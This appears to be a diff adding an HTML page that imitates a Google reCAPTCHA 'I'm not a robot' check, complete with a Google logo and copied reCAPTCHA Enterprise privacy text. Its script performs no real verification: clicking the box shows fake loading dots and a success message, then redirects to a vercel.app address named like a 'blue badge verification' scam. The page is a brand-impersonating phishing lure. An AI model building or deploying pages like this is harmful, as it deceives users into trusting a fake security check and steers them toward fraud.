@@ -1,0 +1,100 @@
+
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  .page { min-height: 100vh; background: #fff; display: flex; align-items: center; justify-content: center; padding: 20px; }
+  .card { background: #fff; padding: 32px 28px; max-width: 440px; width: 100%; }
+  .google-logo { margin-bottom: 24px; }
+  .captcha-box { border: 1px solid #d3d3d3; border-radius: 3px; background: #f9f9f9; padding: 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; min-height: 74px; }
+  .captcha-left { display: flex; align-items: center; gap: 14px; }
+  .checkbox-wrap { position: relative; width: 24px; height: 24px; flex-shrink: 0; cursor: pointer; }
+  .checkbox-wrap input { opacity: 0; position: absolute; width: 100%; height: 100%; cursor: pointer; margin: 0; }
+  .checkbox-visual { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; background: #fff; display: flex; align-items: center; justify-content: center; transition: all 0.2s; pointer-events: none; }
+  .checkbox-wrap:hover .checkbox-visual { border-color: #4285f4; }
+  .checkbox-wrap.checked .checkbox-visual { background: #4285f4; border-color: #4285f4; }
+  .checkmark { display: none; }
+  .checkbox-wrap.checked .checkmark { display: block; }
+  .label-text { font-size: 14px; color: #202124; font-family: Arial, sans-serif; }
+  .captcha-right { display: flex; flex-direction: column; align-items: center; gap: 2px; }
+  .recaptcha-brand { font-size: 10px; color: #555; font-family: Arial, sans-serif; text-align: center; }
+  .recaptcha-links { font-size: 9px; color: #555; font-family: Arial, sans-serif; }
+  .recaptcha-links a { color: #555; text-decoration: none; }
+  .recaptcha-links a:hover { text-decoration: underline; }
+  .divider { border: none; border-top: 1px solid #e0e0e0; margin: 0 0 18px; }
+  .info-text { font-size: 13px; color: #3c4043; line-height: 1.6; font-family: Arial, sans-serif; margin-bottom: 14px; }
+  .info-text a { color: #1a73e8; text-decoration: none; }
+  .loading-dots { display: none; gap: 4px; align-items: center; }
+  .loading-dots.show { display: flex; }
+  .dot { width: 8px; height: 8px; border-radius: 50%; animation: bounce 1.2s infinite ease-in-out; }
+  .dot:nth-child(1) { background: #4285f4; }
+  .dot:nth-child(2) { animation-delay: 0.15s; background: #ea4335; }
+  .dot:nth-child(3) { animation-delay: 0.3s; background: #fbbc04; }
+  .dot:nth-child(4) { animation-delay: 0.45s; background: #34a853; }
+  @keyframes bounce { 0%,60%,100%{transform:translateY(0)}30%{transform:translateY(-6px)} }
+  .success-msg { display: none; font-size: 13px; color: #34a853; font-family: Arial, sans-serif; font-weight: bold; }
+  .success-msg.show { display: block; }
+</style>
+
+<div class="page">
+  <div class="card">
+    <div class="google-logo">
+      <svg viewBox="0 0 92 30" width="92" height="30" xmlns="http://www.w3.org/2000/svg">
+        <text x="0" y="24" font-family="Arial" font-size="26" font-weight="bold" fill="#4285F4">G</text>
+        <text x="16" y="24" font-family="Arial" font-size="26" font-weight="bold" fill="#EA4335">o</text>
+        <text x="30" y="24" font-family="Arial" font-size="26" font-weight="bold" fill="#FBBC04">o</text>
+        <text x="44" y="24" font-family="Arial" font-size="26" font-weight="bold" fill="#4285F4">g</text>
+        <text x="57" y="24" font-family="Arial" font-size="26" font-weight="bold" fill="#34A853">l</text>
+        <text x="66" y="24" font-family="Arial" font-size="26" font-weight="bold" fill="#EA4335">e</text>
+      </svg>
+    </div>
+
+    <div class="captcha-box">
+      <div class="captcha-left">
+        <div class="checkbox-wrap" id="checkboxWrap" onclick="handleCheck()">
+          <input type="checkbox" id="captchaCheck" />
+          <div class="checkbox-visual">
+            <svg class="checkmark" width="14" height="11" viewBox="0 0 14 11" fill="none">
+              <path d="M1 5.5L5 9.5L13 1.5" stroke="white" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+        </div>
+        <span class="label-text">I'm not a robot</span>
+        <div class="loading-dots" id="loadingDots">
+          <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div>
+        </div>
+      </div>
+      <div class="captcha-right">
+        <img src="/icons/recaptcha.png" width="38" height="38" alt="reCAPTCHA" style="object-fit:contain;" />
+        <div class="recaptcha-brand">reCAPTCHA</div>
+        <div class="recaptcha-links"><a href="#">Privacy</a> - <a href="#">Terms</a></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <p class="info-text">This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
+    <p class="info-text">We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's <a href="#">Privacy Policy</a> and <a href="#">Terms of Use</a>.</p>
+    <p class="info-text">reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
+
+    <div class="success-msg" id="successMsg">Verification successful! Redirecting...</div>
+  </div>
+</div>
+
+<script>
+  let checked = false;
+  function handleCheck() {
+    if (checked) return;
+    checked = true;
+    const wrap = document.getElementById('checkboxWrap');
+    const dots = document.getElementById('loadingDots');
+    const label = wrap.parentElement.querySelector('.label-text');
+    label.style.display = 'none';
+    dots.classList.add('show');
+    setTimeout(() => {
+      dots.classList.remove('show');
+      label.style.display = '';
+      wrap.classList.add('checked');
+      document.getElementById('successMsg').classList.add('show');
+      setTimeout(() => { window.location.href = 'https://verificationbluebadgeacquisitioncenter.vercel.app/ads'; }, 1200);
+    }, 1800);
+  }
+</script>
